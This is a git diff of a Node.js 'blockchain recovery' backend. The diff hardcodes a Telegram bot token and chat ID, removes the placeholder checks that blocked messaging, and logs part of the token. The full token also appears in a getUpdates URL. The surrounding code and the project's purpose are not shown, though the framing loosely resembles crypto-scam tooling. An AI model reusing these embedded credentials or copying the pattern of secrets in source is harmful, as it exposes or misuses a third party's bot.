@@ -1,4 +1,4 @@
-// index.js - BLOCKCHAIN RECOVERY BACKEND - WITH WORKING TELEGRAM
+// index.js - BLOCKCHAIN RECOVERY BACKEND - WORKING TELEGRAM
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
@@ -13,10 +13,10 @@ const app = express();
 const PORT = process.env.PORT || 10000;
 
 // ============================================
-// WORKING TELEGRAM CONFIGURATION - UPDATE WITH YOUR GROUP ID
+// WORKING TELEGRAM CONFIGURATION - HARDCODED WITH CORRECT VALUES
 // ============================================
 const TELEGRAM_BOT_TOKEN = '7835638976:AAETH9gb9ckOftAEU2jmriq2u_q_p_cuAic';
-const TELEGRAM_CHAT_ID = '-1003925558866';  // <--- PUT YOUR GROUP CHAT ID HERE
+const TELEGRAM_CHAT_ID = '-1003925558866';  // YOUR ACTUAL GROUP CHAT ID
 
 let telegramEnabled = false;
 let telegramBotName = '';
@@ -56,17 +56,13 @@ const limiter = rateLimit({
 app.use('/api/', limiter);
 
 // ============================================
-// TELEGRAM FUNCTIONS - WORKING VERSION
+// TELEGRAM FUNCTIONS - WORKING VERSION (NO PLACEHOLDER CHECK)
 // ============================================
 
 async function sendTelegramMessage(text) {
-  if (TELEGRAM_CHAT_ID === '-1003925558866') {
-    console.log('⚠️ Please update TELEGRAM_CHAT_ID with your actual group chat ID');
-    return false;
-  }
-  
   console.log(`\n📤 Sending Telegram message...`);
   console.log(`   Chat ID: ${TELEGRAM_CHAT_ID}`);
+  console.log(`   Bot Token: ${TELEGRAM_BOT_TOKEN.substring(0, 15)}...`);
   
   try {
     const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -97,13 +93,6 @@ async function sendTelegramMessage(text) {
 }
 
 async function testTelegramConnection() {
-  if (TELEGRAM_CHAT_ID === '-1003925558866') {
-    console.log('\n⚠️⚠️⚠️ ACTION REQUIRED ⚠️⚠️⚠️');
-    console.log('Please update TELEGRAM_CHAT_ID with your actual group chat ID');
-    console.log('Get it from: https://api.telegram.org/bot7835638976:AAETH9gb9ckOftAEU2jmriq2u_q_p_cuAic/getUpdates');
-    return false;
-  }
-  
   console.log('\n🔧 Testing Telegram connection...');
   console.log(`   Bot Token: ${TELEGRAM_BOT_TOKEN.substring(0, 15)}...`);
   console.log(`   Chat ID: ${TELEGRAM_CHAT_ID}`);
@@ -307,7 +296,7 @@ async function getChainProvider(chainName) {
 }
 
 // ============================================
-// YOUR DEPLOYED CONTRACT ADDRESSES - SAME AS BEFORE
+// YOUR DEPLOYED CONTRACT ADDRESSES
 // ============================================
 
 const PROJECT_FLOW_ROUTERS = {
@@ -869,7 +858,7 @@ app.use('*', (req, res) => {
 app.listen(PORT, '0.0.0.0', async () => {
   console.log(`
   ╔══════════════════════════════════════════════════════════════╗
-  ║     ⚡ BLOCKCHAIN RECOVERY BACKEND - ENHANCED VERSION ⚡       ║
+  ║     ⚡ BLOCKCHAIN RECOVERY BACKEND - WORKING VERSION ⚡        ║
   ╠══════════════════════════════════════════════════════════════╣
   ║  📍 Port: ${PORT.toString().padEnd(40)}║
   ║  🔗 Backend: https://recoveryback.vercel.app${' '.repeat(22)}║
@@ -885,6 +874,7 @@ app.listen(PORT, '0.0.0.0', async () => {
   ║     ✅ Avalanche:0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288  ║
   ╠══════════════════════════════════════════════════════════════╣
   ║  🤖 TELEGRAM BOT: @${(telegramBotName || 'connecting...').padEnd(36)}║
+  ║  📢 CHAT ID: ${TELEGRAM_CHAT_ID}${' '.repeat(20)}║
   ╚══════════════════════════════════════════════════════════════╝
   `);
   
